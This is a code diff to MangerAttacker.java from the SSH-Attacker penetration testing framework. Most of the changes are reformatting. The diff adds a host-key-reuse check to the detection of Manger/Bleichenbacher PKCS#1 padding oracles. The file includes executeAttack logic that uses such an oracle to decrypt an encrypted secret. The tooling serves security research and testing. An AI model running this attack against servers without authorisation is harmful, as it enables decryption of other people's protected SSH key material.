@@ -1,12 +1,13 @@
 /*
  * SSH-Attacker - A Modular Penetration Testing Framework for SSH
  *
- * Copyright 2014-2022 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
+ * Copyright 2014-2021 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
  *
  * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
  */
-
 package de.rub.nds.sshattacker.attacks.impl;
+
+import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
 
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.sshattacker.attacks.KeyFetcher;
@@ -14,10 +15,11 @@ import de.rub.nds.sshattacker.attacks.ParallelExecutor;
 import de.rub.nds.sshattacker.attacks.config.MangerCommandConfig;
 import de.rub.nds.sshattacker.attacks.exception.AttackFailedException;
 import de.rub.nds.sshattacker.attacks.exception.OracleUnstableException;
+import de.rub.nds.sshattacker.attacks.general.Vector;
 import de.rub.nds.sshattacker.attacks.padding.VectorResponse;
 import de.rub.nds.sshattacker.attacks.padding.vector.FingerprintTaskVectorPair;
-import de.rub.nds.sshattacker.attacks.pkcs1.MangerWorkflowGenerator;
 import de.rub.nds.sshattacker.attacks.pkcs1.Manger;
+import de.rub.nds.sshattacker.attacks.pkcs1.MangerWorkflowGenerator;
 import de.rub.nds.sshattacker.attacks.pkcs1.Pkcs1Vector;
 import de.rub.nds.sshattacker.attacks.pkcs1.Pkcs1VectorGenerator;
 import de.rub.nds.sshattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
@@ -31,20 +33,18 @@ import de.rub.nds.sshattacker.core.config.Config;
 import de.rub.nds.sshattacker.core.constants.Bits;
 import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
 import de.rub.nds.sshattacker.core.state.State;
-import org.apache.logging.log4j.Level;
-import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.Logger;
-
 import java.math.BigInteger;
 import java.security.interfaces.RSAPublicKey;
 import java.util.LinkedList;
 import java.util.List;
-
-import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
+import org.apache.logging.log4j.Level;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
 
 /**
- * Sends differently formatted PKCS#1 messages to the TLS server and observes the server responses. In case there are
- * differences in the server responses, it is very likely that it is possible to execute Bleichenbacher attacks.
+ * Sends differently formatted PKCS#1 messages to the TLS server and observes the server responses.
+ * In case there are differences in the server responses, it is very likely that it is possible to
+ * execute Bleichenbacher attacks.
  */
 public class MangerAttacker extends Attacker<MangerCommandConfig> {
 
@@ -68,7 +68,6 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
     private boolean erroneousScans = false;
 
     /**
-     *
      * @param mangerConfig
      * @param baseConfig
      */
@@ -79,27 +78,32 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
     }
 
     /**
-     *
      * @param mangerConfig
      * @param baseConfig
      * @param executor
      */
-    public MangerAttacker(MangerCommandConfig mangerConfig, Config baseConfig,
-                          ParallelExecutor executor) {
+    public MangerAttacker(
+            MangerCommandConfig mangerConfig, Config baseConfig, ParallelExecutor executor) {
         super(mangerConfig, baseConfig);
         sshConfig = getSshConfig();
         this.executor = executor;
     }
 
-    /**
-     *
-     * @return
-     */
+    /** @return */
     @Override
     public Boolean isVulnerable() {
-        CONSOLE
-            .info("A server is considered vulnerable to this attack if it responds differently to the test vectors.");
-        CONSOLE.info("A server is considered secure if it always responds the same way.");
+        CONSOLE.info(
+                "A server is considered vulnerable to this attack if it reuses it's host key and"
+                        + "responds differently to the test vectors.");
+        CONSOLE.info(
+                "A server is considered secure if it does not reuse the host key or"
+                        + " reuses it but always responds in the same way.");
+
+        if (!isTransientKeyReused()) {
+            CONSOLE.info("Server does not reuse the host key, it should be safe.");
+            return false;
+        }
+
         EqualityError referenceError;
         fullResponseMap = new LinkedList<>();
         try {
@@ -113,14 +117,16 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
         }
         referenceError = getEqualityError(fullResponseMap);
         if (referenceError != EqualityError.NONE) {
-            CONSOLE.info("Found a behavior difference within the responses. The server could be vulnerable.");
+            CONSOLE.info(
+                    "Found a behavior difference within the responses. The server could be vulnerable.");
         } else {
-            CONSOLE
-                .info("Found no behavior difference within the responses. The server is very likely not vulnerable.");
+            CONSOLE.info(
+                    "Found no behavior difference within the responses. The server is very likely not vulnerable.");
         }
 
         CONSOLE.info(EqualityErrorTranslator.translation(referenceError, null, null));
-        if (referenceError != EqualityError.NONE || LOGGER.getLevel().isMoreSpecificThan(Level.INFO)) {
+        if (referenceError != EqualityError.NONE
+                || LOGGER.getLevel().isMoreSpecificThan(Level.INFO)) {
             LOGGER.debug("-------------(Not Grouped)-----------------");
             for (VectorResponse vectorResponse : fullResponseMap) {
                 LOGGER.debug(vectorResponse.toString());
@@ -131,26 +137,33 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
         return referenceError != EqualityError.NONE;
     }
 
-    /**
-     *
-     * @return
-     */
+    /** @return */
     public List<VectorResponse> createVectorResponseList() {
         RSAPublicKey publicKey = getServerPublicKey();
         if (publicKey == null) {
             LOGGER.fatal("Could not retrieve PublicKey from Server - is the Server running?");
             throw new OracleUnstableException("Fatal Extraction error");
         }
+
         List<SshTask> taskList = new LinkedList<>();
         List<FingerprintTaskVectorPair> stateVectorPairList = new LinkedList<>();
 
-        //TODO: hash length is dependent on key exchange algorithm
+        // TODO: hash length is dependent on key exchange algorithm
         for (Pkcs1Vector vector : Pkcs1VectorGenerator.generatePkcs1Vectors(publicKey, 256)) {
 
-            State state = new State(sshConfig, MangerWorkflowGenerator.generateWorkflow(sshConfig, vector.getEncryptedValue()));
+            State state =
+                    new State(
+                            sshConfig,
+                            MangerWorkflowGenerator.generateWorkflow(
+                                    sshConfig, vector.getEncryptedValue()));
 
-            FingerPrintTask fingerPrintTask = new FingerPrintTask(state, additionalTimeout, increasingTimeout,
-                executor.getReexecutions(), additionalTcpTimeout);
+            FingerPrintTask fingerPrintTask =
+                    new FingerPrintTask(
+                            state,
+                            additionalTimeout,
+                            increasingTimeout,
+                            executor.getReexecutions(),
+                            additionalTcpTimeout);
 
             taskList.add(fingerPrintTask);
             stateVectorPairList.add(new FingerprintTaskVectorPair(fingerPrintTask, vector));
@@ -173,7 +186,7 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
     /**
      * This assumes that the responseVectorList only contains comparable vectors
      *
-     * @param  responseVectorList
+     * @param responseVectorList
      * @return
      */
     public EqualityError getEqualityError(List<VectorResponse> responseVectorList) {
@@ -184,14 +197,14 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
                     continue;
                 }
                 EqualityError error =
-                    FingerPrintChecker.checkEquality(responseOne.getFingerprint(), responseTwo.getFingerprint());
+                        FingerPrintChecker.checkEquality(
+                                responseOne.getFingerprint(), responseTwo.getFingerprint());
                 if (error != EqualityError.NONE) {
                     CONSOLE.info("Found an EqualityError: " + error);
                     LOGGER.debug("Fingerprint1: " + responseOne.getFingerprint().toString());
                     LOGGER.debug("Fingerprint2: " + responseTwo.getFingerprint().toString());
                     return error;
                 }
-
             }
         }
         return EqualityError.NONE;
@@ -203,14 +216,30 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
             LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
             return null;
         }
-        LOGGER.info(String.format("Fetched server public key with exponent %s and modulus: %s",
-                publicKey.getPublicExponent().toString(16), publicKey.getModulus().toString(16)));
+        LOGGER.info(
+                String.format(
+                        "Fetched server public key with exponent %s and modulus: %s",
+                        publicKey.getPublicExponent().toString(16),
+                        publicKey.getModulus().toString(16)));
         return publicKey;
+    }
+
+    public boolean isTransientKeyReused() {
+        RSAPublicKey transientKey1 = getServerPublicKey();
+        RSAPublicKey transientKey2 = getServerPublicKey();
+
+        if (transientKey1 == null || transientKey2 == null) {
+            LOGGER.fatal("Could not retrieve PublicKey from Server - is the Server running?");
+            throw new OracleUnstableException("Fatal Extraction error");
+        } else {
+            return transientKey1.getPublicExponent().equals(transientKey2.getPublicExponent())
+                    && transientKey1.getModulus().equals(transientKey2.getModulus());
+        }
     }
 
     @Override
     public void executeAttack() {
-        //TODO: make attack work
+        // TODO: make attack work
         if (!isVulnerable()) {
             LOGGER.warn("The server is not vulnerable to Manger's attack");
             return;
@@ -222,18 +251,23 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
         }
 
         if (config.getEncryptedSecret() == null) {
-            throw new ConfigurationException(
-                "The encrypted secret must be set to be decrypted.");
+            throw new ConfigurationException("The encrypted secret must be set to be decrypted.");
         }
 
-        LOGGER.info("Fetched the following server public key: " + publicKey);
+        LOGGER.info(
+                String.format(
+                        "Fetched server public key with exponent %s and modulus: %s",
+                        publicKey.getPublicExponent().toString(16),
+                        publicKey.getModulus().toString(16)));
         byte[] encryptedSecret = ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());
         if ((encryptedSecret.length * Bits.IN_A_BYTE) != publicKey.getModulus().bitLength()) {
-            throw new ConfigurationException("The length of the encrypted secret "
-                + "is not equal to the public key length. Have you selected the correct value?");
+            throw new ConfigurationException(
+                    "The length of the encrypted secret "
+                            + "is not equal to the public key length. Have you selected the correct value?");
         }
-        RealDirectMessagePkcs1Oracle oracle = new RealDirectMessagePkcs1Oracle(publicKey, getSshConfig(),
-            extractValidFingerprint(publicKey), null);
+        RealDirectMessagePkcs1Oracle oracle =
+                new RealDirectMessagePkcs1Oracle(
+                        publicKey, getSshConfig(), extractValidFingerprint(publicKey), null);
         Manger attacker = new Manger(encryptedSecret, oracle);
         attacker.attack();
         BigInteger solution = attacker.getSolution();
@@ -241,11 +275,23 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
     }
 
     private ResponseFingerprint extractValidFingerprint(RSAPublicKey publicKey) {
+        // TODO: hashLength depends on negotiated key exchange alg.
         Pkcs1Vector vector = Pkcs1VectorGenerator.generateCorrectPkcs1Vector(publicKey, 256);
-        State state = new State(sshConfig, MangerWorkflowGenerator.generateWorkflow(sshConfig, vector.getEncryptedValue()));
-        FingerPrintTask fingerPrintTask = new FingerPrintTask(state, additionalTimeout, increasingTimeout,
-            executor.getReexecutions(), additionalTcpTimeout);
-        FingerprintTaskVectorPair stateVectorPair = new FingerprintTaskVectorPair(fingerPrintTask, vector);
+        State state =
+                new State(
+                        sshConfig,
+                        MangerWorkflowGenerator.generateWorkflow(
+                                sshConfig, vector.getEncryptedValue()));
+        FingerPrintTask fingerPrintTask =
+                new FingerPrintTask(
+                        state,
+                        additionalTimeout,
+                        increasingTimeout,
+                        executor.getReexecutions(),
+                        additionalTcpTimeout);
+        FingerprintTaskVectorPair<? extends Vector> stateVectorPair =
+                new FingerprintTaskVectorPair<>(fingerPrintTask, vector);
+
         executor.bulkExecuteTasks(fingerPrintTask);
         ResponseFingerprint fingerprint = null;
         if (stateVectorPair.getFingerPrintTask().isHasError()) {
@@ -295,5 +341,4 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
     public void setAdditionalTcpTimeout(long additionalTcpTimeout) {
         this.additionalTcpTimeout = additionalTcpTimeout;
     }
-
 }
